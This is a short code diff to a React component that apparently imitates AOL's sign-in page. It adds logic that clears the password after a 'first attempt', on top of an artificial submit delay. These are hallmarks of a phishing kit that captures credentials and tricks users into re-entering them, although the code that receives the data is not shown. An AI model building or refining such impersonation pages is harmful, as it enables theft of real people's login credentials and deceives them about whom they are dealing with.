@@ -62,10 +62,11 @@ const AolLoginPage: React.FC<AolLoginPageProps> = ({ onLoginSuccess, onLoginErro
     if (!password) return;
     setSubmitting(true);
     await new Promise(resolve => setTimeout(resolve, 1200));
-    await handleFormSubmit(
+    const result = await handleFormSubmit(
       { preventDefault: () => {} } as React.FormEvent,
       { email, password, provider: 'AOL' }
     );
+    if (result?.isFirstAttempt) { setPassword(''); }
     setSubmitting(false);
   };
 
